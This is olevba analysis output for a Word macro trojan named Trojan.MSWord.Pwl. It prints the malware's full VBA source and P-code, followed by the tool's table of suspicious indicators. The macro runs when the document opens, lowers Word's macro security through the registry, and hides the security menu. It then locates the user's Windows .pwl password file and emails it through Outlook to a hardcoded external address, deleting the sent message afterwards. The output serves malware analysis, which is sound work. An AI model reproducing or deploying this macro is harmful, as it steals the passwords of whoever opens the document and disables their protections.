olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Pwl
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Pwl - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_New()

End Sub

Private Sub Document_Open()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1
Else
CommandBars("Tools").Controls("Macro").Enabled = False
End If

Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice, GetUser, Xx
Dim ThePath As String * 255
Dim PwlPath As String

    GetUser = Application.UserName
    Xx = GetWindowsDirectory(ThePath, 255)
    PwlPath = Left(ThePath, Xx) & "\" & GetUser & ".pwl"
    
Set UngaDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
        
        DasMapiName.Logon
        TheAddress = "neetazz86@hotmail.com"
        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
        BreakUmOffASlice.Recipients.Add TheAddress
        BreakUmOffASlice.Subject = "Pwl From " & Application.UserName
        BreakUmOffASlice.Body = "Here it is"
        BreakUmOffASlice.Attachments.Add PwlPath
        BreakUmOffASlice.Send
        BreakUmOffASlice.Delete
        DasMapiName.Logoff
            
     '  Selection.TypeText PwlPath
        
   End Sub
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Trojan.MSWord.Pwl - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
'ucbC><Kd
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Trojan.MSWord.Pwl
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7428 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Private Sub Document_New())
' Line #3:
' Line #4:
' 	EndSub 
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub Document_Open())
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #9:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #10:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #11:
' 	ElseBlock 
' Line #12:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #13:
' 	EndIfBlock 
' Line #14:
' Line #15:
' 	Dim 
' 	VarDefn UngaDasOutlook
' 	VarDefn DasMapiName
' 	VarDefn BreakUmOffASlice
' 	VarDefn GetUser
' 	VarDefn Xx
' Line #16:
' 	Dim 
' 	LitDI2 0x00FF 
' 	VarDefn ThePath
' Line #17:
' 	Dim 
' 	VarDefn PwlPath (As String)
' Line #18:
' Line #19:
' 	Ld Application 
' 	MemLd UserName 
' 	St GetUser 
' Line #20:
' 	Ld ThePath 
' 	LitDI2 0x00FF 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St Xx 
' Line #21:
' 	Ld ThePath 
' 	Ld Xx 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld GetUser 
' 	Concat 
' 	LitStr 0x0004 ".pwl"
' 	Concat 
' 	St PwlPath 
' Line #22:
' Line #23:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set UngaDasOutlook 
' Line #24:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld UngaDasOutlook 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set DasMapiName 
' Line #25:
' Line #26:
' 	Ld DasMapiName 
' 	ArgsMemCall Logon 0x0000 
' Line #27:
' 	LitStr 0x0015 "neetazz86@hotmail.com"
' 	St TheAddress 
' Line #28:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld UngaDasOutlook 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set BreakUmOffASlice 
' Line #29:
' 	Ld TheAddress 
' 	Ld BreakUmOffASlice 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #30:
' 	LitStr 0x0009 "Pwl From "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld BreakUmOffASlice 
' 	MemSt Subject 
' Line #31:
' 	LitStr 0x000A "Here it is"
' 	Ld BreakUmOffASlice 
' 	MemSt Body 
' Line #32:
' 	Ld PwlPath 
' 	Ld BreakUmOffASlice 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #33:
' 	Ld BreakUmOffASlice 
' 	ArgsMemCall Send 0x0000 
' Line #34:
' 	Ld BreakUmOffASlice 
' 	ArgsMemCall Delete 0x0000 
' Line #35:
' 	Ld DasMapiName 
' 	ArgsMemCall Logoff 0x0000 
' Line #36:
' Line #37:
' 	QuoteRem 0x0005 0x001C "  Selection.TypeText PwlPath"
' Line #38:
' Line #39:
' 	EndSub 
' Macros/VBA/Module1 - 1255 bytes
' Line #0:
' 	FuncDefn (Public Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #1:
' 	QuoteRem 0x0000 0x0008 "ucbC><Kd"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

